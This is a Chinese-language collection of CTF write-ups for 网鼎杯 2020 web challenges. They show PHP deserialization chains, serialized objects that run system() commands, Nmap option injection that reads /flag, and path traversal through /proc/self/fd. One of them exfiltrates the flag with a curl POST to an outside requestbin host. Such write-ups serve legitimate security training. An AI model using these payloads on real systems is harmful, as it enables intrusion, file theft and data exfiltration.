# 青龙组

## [网鼎杯 2020 青龙组]AreUSerialz

打开页面，通过代码审计，初步思路应该是读取文件即可

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

接下来，按照思路写利用链，　进入process函数后，如果op=="1"，则进入write函数，若op=="2"，则进入read函数，否则输出报错，可以看出来这里op与字符串的比较变成了弱类型比较==

```
<?php
class FileHandler {

    protected $op=2;
    protected $filename= "php://filter/read=convert.base64-encode/resource=flag.php";
    protected $content;


}
$a = new FileHandler();
echo urlencode(serialize($a));
//unserialize(serialize($a));
```

即可读取flag，利用了php7.1+对属性不敏感

> 需要注意的是，$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验

# 朱雀组

## [网鼎杯 2020 朱雀组]phpweb

打开题目环境，没发现源码泄露，尝试BurpSuite抓包

发现关键参数，猜测可以执行任意文件

```
func=date&p=Y-m-d h:i:s a
```

尝试执行phpinfo失败，应该是有waf，尝试读取文件成功

```
func=file_get_contents&p=index.php
```

代码审计

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

禁用了一堆函数，看见类尝试使用反序列化试试

首先查看phpinfo，看看配置中禁用的函数，发现啥都没有

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:1:"1";s:4:"func";s:7:"phpinfo";}
```

简单的使用了ls等命令后未发现flag，使用find命令

```
O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
```

得到结果

```
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth1/flags
/tmp/flagoefiu4r93
```

之后cat即可

```
O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

## [网鼎杯 2020 朱雀组]Nmap

```
' -iL /flag -oN flag.txt '
```

```
用-iL 把文件名作为选项传给Nmap
```

之后访问flag.txt即可

```
# Nmap 6.47 scan initiated Thu Jan 14 07:15:57 2021 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/fd61f -iL /flag -oN flag.txt \ \\
Failed to resolve "flag{29e8248b-ff71-46ff-8b08-53d0192e158b}".
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Thu Jan 14 07:15:57 2021 -- 0 IP addresses (0 hosts up) scanned in 0.12 seconds
```

# 青龙组

## [网鼎杯 2020 白虎组]PicDown

打开发现参数拼接，会将网址结果返回为jpg文件

```
http://4a6fb514-4e6c-4b72-a635-80be6c793ae6.node3.buuoj.cn/page?url=???
```

尝试访问本地文件失败

```
http://4a6fb514-4e6c-4b72-a635-80be6c793ae6.node3.buuoj.cn/page?url=http://127.0.0.1:80/index.php
```

发现可以目录穿越读取任意文件

```
url=../../../../../../etc/passwd
```

再读取`/proc/self/cmdline`发现结果

```
python2 app.py
```

?url=app.py读一下，得到源码

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

程序读取完SECRET_KEY会删除/tmp/secret.txt,但在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（如os.remove(SECRET_FILE)）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。/proc/[pid]/fd 这个目录里包含了进程打开文件的情况；；pid就是进程记录的打开文件的序号

`GET /page?url=../../../../../../proc/self/fd/3`

得到

```
Q5/D1nib7wrAzbRJh7TOBL2YubyPFCDb0QbVd3igL7A=
```

尝试发现无回显，那么带外输出即可

```
http://4a6fb514-4e6c-4b72-a635-80be6c793ae6.node3.buuoj.cn/no_one_know_the_manager?key=Q5/D1nib7wrAzbRJh7TOBL2YubyPFCDb0QbVd3igL7A=&shell=curl -X POST -d "flag=`cat /flag`" http://requestbin.net/r/1l5u7d01
```

检查request.bin得到flag